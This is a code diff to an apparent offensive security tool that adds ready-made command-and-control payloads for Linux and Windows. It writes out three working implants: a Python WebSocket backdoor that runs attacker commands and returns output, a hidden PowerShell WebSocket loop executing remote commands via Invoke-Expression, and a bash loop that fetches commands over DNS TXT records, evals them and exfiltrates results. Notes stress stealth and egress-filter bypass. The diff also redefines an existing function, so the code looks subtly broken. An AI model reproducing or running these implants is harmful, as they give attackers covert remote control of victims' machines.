@@ -262,3 +262,54 @@ export function buildAllEchoPayloads(cbUrl: string, token: string): EchoPayload[
     ...buildWindowsExfilPayloads(cbUrl, token),
   ];
 }
+
+export function buildWebSocketC2Payloads(cbUrl: string, token: string): EchoPayload[] {
+  const h = oobHost(cbUrl);
+  return [
+    { id:"ws_c2_python", name:"WebSocket C2 channel (Python, full duplex)", category:"WebSocket-C2",
+      protocol:"ws", os:"linux", stealth:5,
+      command:`python3 -c "
+import threading,subprocess,os,base64,time
+try:
+  import websocket
+except:
+  os.system('pip3 install websocket-client -q 2>/dev/null')
+  import websocket
+def on_msg(ws,msg):
+  try:
+    cmd=base64.b64decode(msg if isinstance(msg,bytes) else msg.encode()).decode()
+    out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT,timeout=15).decode(errors='replace')
+    ws.send(base64.b64encode(out.encode()).decode())
+  except Exception as e: ws.send(base64.b64encode(str(e).encode()).decode())
+def on_open(ws):
+  ws.send(base64.b64encode(f'NX_CONNECT:{os.popen(\"id&&hostname\").read()}'.encode()).decode())
+while True:
+  try:
+    ws=websocket.WebSocketApp(f'ws://${h}:${token}',on_message=on_msg,on_open=on_open)
+    ws.run_forever(ping_interval=30)
+  except: pass
+  time.sleep(60)
+" 2>/dev/null &`,
+      notes:"Full-duplex WebSocket C2 — base64 encoded commands+output. Auto-reconnects. Standard WS port bypasses most egress filters." },
+    { id:"ws_c2_powershell", name:"WebSocket C2 channel (PowerShell, ClientWebSocket)", category:"WebSocket-C2",
+      protocol:"ws", os:"windows", stealth:5,
+      command:`powershell -NonI -W Hidden -c "while($true){try{$ws=New-Object System.Net.WebSockets.ClientWebSocket;$t=[Threading.CancellationToken]::None;$null=$ws.ConnectAsync([Uri]'ws://${h}:${token}',$t).Result;$buf=[byte[]]::new(65536);$seg=[ArraySegment[byte]]::new($buf);while($ws.State-eq'Open'){$r=$ws.ReceiveAsync($seg,$t).Result;if($r.Count-gt0){$cmd=[Text.Encoding]::UTF8.GetString($buf,0,$r.Count);try{$out=Invoke-Expression $cmd|Out-String}catch{$out=$_.Exception.Message};$ob=[Text.Encoding]::UTF8.GetBytes($out);$null=$ws.SendAsync([ArraySegment[byte]]::new($ob),1,$true,$t).Result}}}catch{};Start-Sleep 60}" 2>nul &`,
+      notes:"PowerShell ClientWebSocket — native .NET WebSocket. No external dependencies. Survives PS session close via async loop." },
+    { id:"dns_txt_c2_poll", name:"DNS TXT record C2 polling", category:"DNS-C2",
+      protocol:"dns", os:"linux", stealth:5,
+      command:`while true; do _CMD=$(dig TXT "cmd.${token}.${h}" +short 2>/dev/null|tr -d '"'|base64 -d 2>/dev/null); [ -n "$_CMD" ] && eval "$_CMD" 2>&1|base64 -w0|xargs -I{} dig @8.8.8.8 "out.{}.${token}.${h}" 2>/dev/null; sleep 60; done &`,
+      notes:"DNS TXT record C2 — poll cmd.token.domain every 60s for base64 encoded commands. Pure DNS C2, works through web proxies." },
+  ];
+}
+
+export function buildAllEchoPayloads(cbUrl: string, token: string): EchoPayload[] {
+  const host = oobHost(cbUrl);
+  return [
+    ...buildDoHTunnelPayloads(host, token),
+    ...buildHttpHeaderStegPayloads(cbUrl, token),
+    ...buildCloudStorageExfil(cbUrl, token),
+    ...buildIcmpTunnelPayloads(host, token),
+    ...buildWindowsExfilPayloads(cbUrl, token),
+    ...buildWebSocketC2Payloads(cbUrl, token),
+  ];
+}
